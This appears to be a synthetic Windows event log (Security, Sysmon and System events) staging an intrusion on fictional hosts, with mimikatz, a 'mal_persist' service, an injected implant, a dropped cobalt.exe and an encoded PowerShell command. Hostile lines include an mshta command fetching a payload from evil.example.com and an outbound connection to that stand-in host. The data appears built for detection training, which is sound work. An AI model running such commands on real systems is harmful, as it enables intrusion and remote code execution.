<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Eventlog" /><EventID>1102</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:50:49.0000000Z" /><EventRecordID>1510</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="SubjectLogonId">0x52c6cc</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:50:54.0000000Z" /><EventRecordID>1511</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8655-6291-7099-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">25790</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:51:00.0000000Z" /><EventRecordID>1512</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7904-8790-6483-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">43483</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:51:09.0000000Z" /><EventRecordID>1513</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">13224</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:51:28.0000000Z" /><EventRecordID>1514</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:51:28.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">48903</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="TargetObject">HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:52:49.0000000Z" /><EventRecordID>1515</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">.</Data><Data Name="ServiceName">WinRM</Data><Data Name="ServiceFileName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:53:02.0000000Z" /><EventRecordID>1516</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="Workstation">JUMPHOST01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:53:21.0000000Z" /><EventRecordID>1517</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1467-3687-9391-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">61471</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:53:43.0000000Z" /><EventRecordID>1518</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:53:43.0000000Z</Data><Data Name="ProcessGuid">{0D1A2-429B-5558-C569}</Data><Data Name="ProcessId">52961</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="User">CONTOSO\charlie</Data><Data Name="ParentProcessId">5770</Data><Data Name="ParentImage">C:\Windows\System32\powershell.exe</Data><Data Name="ParentCommandLine">svchost.exe -k netsvcs</Data><Data Name="Hashes">MD5=a5da5f65d6db532ad813e975ae423700,SHA256=c5929aa899f8c125aad74d33715209e25cad0c2ccfd6204dda12ba4e4a799314</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:53:47.0000000Z" /><EventRecordID>1519</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">11125</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>8</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:53:59.0000000Z" /><EventRecordID>1520</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:53:59.0000000Z</Data><Data Name="SourceProcessId">1324</Data><Data Name="SourceImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetProcessId">32283</Data><Data Name="TargetImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="NewThreadId">2710</Data><Data Name="StartAddress">0x7ff3583f097d</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:54:10.0000000Z" /><EventRecordID>1521</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="Workstation">SRV-WEB01</Data><Data Name="Status">0xC0000064</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:54:15.0000000Z" /><EventRecordID>1522</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">.</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::10.100.10.50</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:55:10.0000000Z" /><EventRecordID>1523</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="ServiceName">mal_persist</Data><Data Name="ServiceFileName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:55:16.0000000Z" /><EventRecordID>1524</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0x6e7f</Data><Data Name="NewProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="ParentProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x6cb</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:55:46.0000000Z" /><EventRecordID>1525</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0xb544</Data><Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="ParentProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x4ae</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:55:56.0000000Z" /><EventRecordID>1526</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8133-2521-6563-1001</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">43887</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:56:25.0000000Z" /><EventRecordID>1527</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">newuser418</Data><Data Name="TargetDomainName">CORP</Data><Data Name="PrivilegeList">-</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:56:27.0000000Z" /><EventRecordID>1528</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="SubjectLogonId">0xbeadd1</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:57:16.0000000Z" /><EventRecordID>1529</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>DC02</Computer></System><EventData><Data Name="ServiceName">Schedule</Data><Data Name="ImagePath">C:\Windows\System32\powershell.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>8</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:57:29.0000000Z" /><EventRecordID>1530</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:57:29.0000000Z</Data><Data Name="SourceProcessId">53661</Data><Data Name="SourceImage">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="TargetProcessId">53882</Data><Data Name="TargetImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="NewThreadId">300</Data><Data Name="StartAddress">0x7ffa292fadf7</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:57:30.0000000Z" /><EventRecordID>1531</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8964-7581-7921-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">20878</Data><Data Name="ProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:57:34.0000000Z" /><EventRecordID>1532</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">.</Data><Data Name="SubjectLogonId">0xd7efd8</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:57:47.0000000Z" /><EventRecordID>1533</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="Workstation">WKSTN-ALICE</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:58:35.0000000Z" /><EventRecordID>1534</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="TargetUserName">newuser991</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="PrivilegeList">-</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:58:52.0000000Z" /><EventRecordID>1535</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8454-8125-1795-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">19486</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:59:21.0000000Z" /><EventRecordID>1536</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7050-5134-7974-1001</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">45260</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:59:27.0000000Z" /><EventRecordID>1537</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:59:27.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">20217</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\mal_persist\ImagePath</Data><Data Name="Details">mshta.exe http://evil.example.com/payload.hta</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:02:09.0000000Z" /><EventRecordID>1538</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="TaskName">\mal_task</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:02:22.0000000Z" /><EventRecordID>1539</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:02:22.0000000Z</Data><Data Name="ProcessGuid">{0A65C-80C8-5218-138F9}</Data><Data Name="ProcessId">7197</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="User">CONTOSO\jane.smith</Data><Data Name="ParentProcessId">2469</Data><Data Name="ParentImage">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="ParentCommandLine">svchost.exe -k netsvcs</Data><Data Name="Hashes">MD5=e79a5c6e9f1489e4167e5246223c6b58,SHA256=ff57cbf8e8824175ffc661b0d483039e3e627d3eded834ebd7a558d3cf0c51e7</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:02:24.0000000Z" /><EventRecordID>1540</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:02:24.0000000Z</Data><Data Name="ProcessId">6015</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetFilename">C:\temp\cobalt.exe</Data><Data Name="CreationUtcTime">2024-11-25T16:02:24.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:02:37.0000000Z" /><EventRecordID>1541</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0x6678</Data><Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data><Data Name="ParentProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xfd6</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:02:39.0000000Z" /><EventRecordID>1542</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:02:39.0000000Z</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="User">CONTOSO\svc_sql</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.0.1.12</Data><Data Name="SourcePort">55868</Data><Data Name="DestinationIp">10.100.10.50</Data><Data Name="DestinationPort">8080</Data><Data Name="DestinationHostname">evil.example.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:02:49.0000000Z" /><EventRecordID>1543</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:02:49.0000000Z</Data><Data Name="ProcessId">41342</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="QueryName">update.legit.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">192.168.1.200</Data></EventData></Event>
